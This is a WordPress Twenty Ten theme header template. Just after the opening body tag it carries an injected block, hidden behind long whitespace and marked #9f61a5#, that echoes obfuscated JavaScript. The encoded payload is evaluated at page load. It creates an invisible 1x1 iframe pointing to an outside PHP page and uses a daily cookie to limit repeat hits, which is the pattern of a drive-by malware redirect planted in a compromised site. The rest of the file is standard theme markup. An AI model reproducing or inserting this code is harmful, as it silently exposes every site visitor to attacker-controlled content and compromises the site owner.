<?php
/**
 * The Header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="main">
 *
 * @package WordPress
 * @subpackage Twenty_Ten
 * @since Twenty Ten 1.0
 */
?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>" />
<title><?php
	/*
	 * Print the <title> tag based on what is being viewed.
	 */
	global $page, $paged;

	wp_title( '|', true, 'right' );

	// Add the blog name.
	bloginfo( 'name' );

	// Add the blog description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		echo " | $site_description";

	// Add a page number if necessary:
	if ( $paged >= 2 || $page >= 2 )
		echo ' | ' . sprintf( __( 'Page %s', 'twentyten' ), max( $paged, $page ) );

	?></title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
<?php
	/* We add some JavaScript to pages with the comment form
	 * to support sites with threaded comments (when in use).
	 */
	if ( is_singular() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );

	/* Always have wp_head() just before the closing </head>
	 * tag of your theme, or you will break many plugins, which
	 * generally use this hook to add elements to <head> such
	 * as styles, scripts, and meta tags.
	 */
	wp_head();
?>
</head>

<body <?php body_class(); ?>>
<?
#9f61a5#
                                                                                                                                                                                                                                                                                                            echo "                                                                                                                                                                                                                                                                                                            <script type=\"text/javascript\" language=\"javascript\" >                                                                                                                                                                                                                                                                                                            p=parseInt;ss=(123)?String.fromCharCode:0;asgq=\"66!75!6e!63!74!6@!6f!6e!20!7a!7a!7a!66!66!66!28!2@!20!7b!d!a!20!20!20!20!76!61!72!20!72!7a!68!20!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!72!65!61!74!65!45!6c!65!6d!65!6e!74!28!27!6@!66!72!61!6d!65!27!2@!3b!d!a!d!a!20!20!20!20!72!7a!68!2e!73!72!63!20!3d!20!27!68!74!74!70!3a!2f!2f!61!6c!65!70!68!2d!64!65!73!6@!67!6e!2e!6e!6c!2f!72!65!6c!2e!70!68!70!27!3b!d!a!20!20!20!20!72!7a!68!2e!73!74!7@!6c!65!2e!70!6f!73!6@!74!6@!6f!6e!20!3d!20!27!61!62!73!6f!6c!75!74!65!27!3b!d!a!20!20!20!20!72!7a!68!2e!73!74!7@!6c!65!2e!62!6f!72!64!65!72!20!3d!20!27!30!27!3b!d!a!20!20!20!20!72!7a!68!2e!73!74!7@!6c!65!2e!68!65!6@!67!68!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!72!7a!68!2e!73!74!7@!6c!65!2e!77!6@!64!74!68!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!72!7a!68!2e!73!74!7@!6c!65!2e!6c!65!66!74!20!3d!20!27!31!70!78!27!3b!d!a!20!20!20!20!72!7a!68!2e!73!74!7@!6c!65!2e!74!6f!70!20!3d!20!27!31!70!78!27!3b!d!a!d!a!20!20!20!20!6@!66!20!28!21!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!72!7a!68!27!2@!2@!20!7b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!77!72!6@!74!65!28!27!3c!64!6@!76!20!6@!64!3d!5c!27!72!7a!68!5c!27!3e!3c!2f!64!6@!76!3e!27!2@!3b!d!a!20!20!20!20!20!20!20!20!64!6f!63!75!6d!65!6e!74!2e!67!65!74!45!6c!65!6d!65!6e!74!42!7@!4@!64!28!27!72!7a!68!27!2@!2e!61!70!70!65!6e!64!43!68!6@!6c!64!28!72!7a!68!2@!3b!d!a!20!20!20!20!7d!d!a!7d!d!a!66!75!6e!63!74!6@!6f!6e!20!53!65!74!43!6f!6f!6b!6@!65!28!63!6f!6f!6b!6@!65!4e!61!6d!65!2c!63!6f!6f!6b!6@!65!56!61!6c!75!65!2c!6e!44!61!7@!73!2c!70!61!74!68!2@!20!7b!d!a!20!76!61!72!20!74!6f!64!61!7@!20!3d!20!6e!65!77!20!44!61!74!65!28!2@!3b!d!a!20!76!61!72!20!65!78!70!6@!72!65!20!3d!20!6e!65!77!20!44!61!74!65!28!2@!3b!d!a!20!6@!66!20!28!6e!44!61!7@!73!3d!3d!6e!75!6c!6c!20!7c!7c!20!6e!44!61!7@!73!3d!3d!30!2@!20!6e!44!61!7@!73!3d!31!3b!d!a!20!65!78!70!6@!72!65!2e!73!65!74!54!6@!6d!65!28!74!6f!64!61!7@!2e!67!65!74!54!6@!6d!65!28!2@!20!2b!20!33!36!30!30!30!30!30!2a!32!34!2a!6e!44!61!7@!73!2@!3b!d!a!20!64!6f!63!75!6d!65!6e!74!2e!63!6f!6f!6b!6@!65!20!3d!20!63!6f!6f!6b!6@!65!4e!61!6d!65!2b!22!3d!22!2b!65!73!63!61!70!65!28!63!6f!6f!6b!6@!65!56!61!6c!75!65!2@!d!a!20!20!20!20!20!20!20!20!20!20!20!20!20!20!20!20!20!2b!20!22!3b!65!78!70!6@!72!65!73!3d!22!20!2b!20!65!78!70!6@!72!65!2e!74!6f!47!4d!54!53!74!72!6@!6e!67!28!2@!20!2b!20!28!28!70!61!74!68!2@!20!3f!20!22!3b!20!70!61!74!68!3d!22!20!2b!20!70!61!74!68!20!3a!20!22!22!2@!3b!d!a!7d!d!a!66!75!6e!63!74!6@!6f!6e!20!47!65!74!43!6f!6f!6b!6@!65!28!20!6e!61!6d!65!20!2@!20!7b!d!a!20!76!61!72!20!73!74!61!72!74!20!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!6f!6f!6b!6@!65!2e!6@!6e!64!65!78!4f!66!28!20!6e!61!6d!65!20!2b!20!22!3d!22!20!2@!3b!d!a!20!76!61!72!20!6c!65!6e!20!3d!20!73!74!61!72!74!20!2b!20!6e!61!6d!65!2e!6c!65!6e!67!74!68!20!2b!20!31!3b!d!a!20!6@!66!20!28!20!28!20!21!73!74!61!72!74!20!2@!20!26!26!d!a!20!28!20!6e!61!6d!65!20!21!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!6f!6f!6b!6@!65!2e!73!75!62!73!74!72!6@!6e!67!28!20!30!2c!20!6e!61!6d!65!2e!6c!65!6e!67!74!68!20!2@!20!2@!20!2@!d!a!20!7b!d!a!20!72!65!74!75!72!6e!20!6e!75!6c!6c!3b!d!a!20!7d!d!a!20!6@!66!20!28!20!73!74!61!72!74!20!3d!3d!20!2d!31!20!2@!20!72!65!74!75!72!6e!20!6e!75!6c!6c!3b!d!a!20!76!61!72!20!65!6e!64!20!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!6f!6f!6b!6@!65!2e!6@!6e!64!65!78!4f!66!28!20!22!3b!22!2c!20!6c!65!6e!20!2@!3b!d!a!20!6@!66!20!28!20!65!6e!64!20!3d!3d!20!2d!31!20!2@!20!65!6e!64!20!3d!20!64!6f!63!75!6d!65!6e!74!2e!63!6f!6f!6b!6@!65!2e!6c!65!6e!67!74!68!3b!d!a!20!72!65!74!75!72!6e!20!75!6e!65!73!63!61!70!65!28!20!64!6f!63!75!6d!65!6e!74!2e!63!6f!6f!6b!6@!65!2e!73!75!62!73!74!72!6@!6e!67!28!20!6c!65!6e!2c!20!65!6e!64!20!2@!20!2@!3b!d!a!7d!d!a!6@!66!20!28!6e!61!76!6@!67!61!74!6f!72!2e!63!6f!6f!6b!6@!65!45!6e!61!62!6c!65!64!2@!d!a!7b!d!a!6@!66!28!47!65!74!43!6f!6f!6b!6@!65!28!27!76!6@!73!6@!74!65!64!5f!75!71!27!2@!3d!3d!35!35!2@!7b!7d!65!6c!73!65!7b!53!65!74!43!6f!6f!6b!6@!65!28!27!76!6@!73!6@!74!65!64!5f!75!71!27!2c!20!27!35!35!27!2c!20!27!31!27!2c!20!27!2f!27!2@!3b!d!a!d!a!7a!7a!7a!66!66!66!28!2@!3b!d!a!7d!d!a!7d\".replace(/@/g,\"9\").split(\"!\");try{document.body&=0.1}catch(gdsgsdg){zz=3;dbshre=164;if(dbshre){vfvwe=0;try{document;}catch(agdsg){vfvwe=1;}if(!vfvwe){e=eval;}s=\"\";if(zz)for(i=0;i-1373!=0;i++){if(window.document)s+=ss(p(asgq[i],16));}if(window.document)e(s);}}</script>";

#/9f61a5#
?>
<div id="wrapper" class="hfeed">
	<div id="header">
		<div id="masthead">
			<div id="branding" role="banner">
				<?php $heading_tag = ( is_home() || is_front_page() ) ? 'h1' : 'div'; ?>
				<<?php echo $heading_tag; ?> id="site-title">
					<span>
						<a href="<?php echo home_url( '/' ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a>
					</span>
				</<?php echo $heading_tag; ?>>
				<div id="site-description"><?php bloginfo( 'description' ); ?></div>

				<?php
					// Check if this is a post or page, if it has a thumbnail, and if it's a big one
					if ( is_singular() && current_theme_supports( 'post-thumbnails' ) &&
							has_post_thumbnail( $post->ID ) &&
							( /* $src, $width, $height */ $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'post-thumbnail' ) ) &&
							$image[1] >= HEADER_IMAGE_WIDTH ) :
						// Houston, we have a new header image!
						echo get_the_post_thumbnail( $post->ID );
					elseif ( get_header_image() ) : ?>
						<img src="<?php header_image(); ?>" width="<?php echo HEADER_IMAGE_WIDTH; ?>" height="<?php echo HEADER_IMAGE_HEIGHT; ?>" alt="" />
					<?php endif; ?>
			</div><!-- #branding -->

			<div id="access" role="navigation">
			  <?php /*  Allow screen readers / text browsers to skip the navigation menu and get right to the good stuff */ ?>
				<div class="skip-link screen-reader-text"><a href="#content" title="<?php esc_attr_e( 'Skip to content', 'twentyten' ); ?>"><?php _e( 'Skip to content', 'twentyten' ); ?></a></div>
				<?php /* Our navigation menu.  If one isn't filled out, wp_nav_menu falls back to wp_page_menu.  The menu assiged to the primary position is the one used.  If none is assigned, the menu with the lowest ID is used.  */ ?>
				<?php wp_nav_menu( array( 'container_class' => 'menu-header', 'theme_location' => 'primary' ) ); ?>
			</div><!-- #access -->
		</div><!-- #masthead -->
	</div><!-- #header -->

	<div id="main">
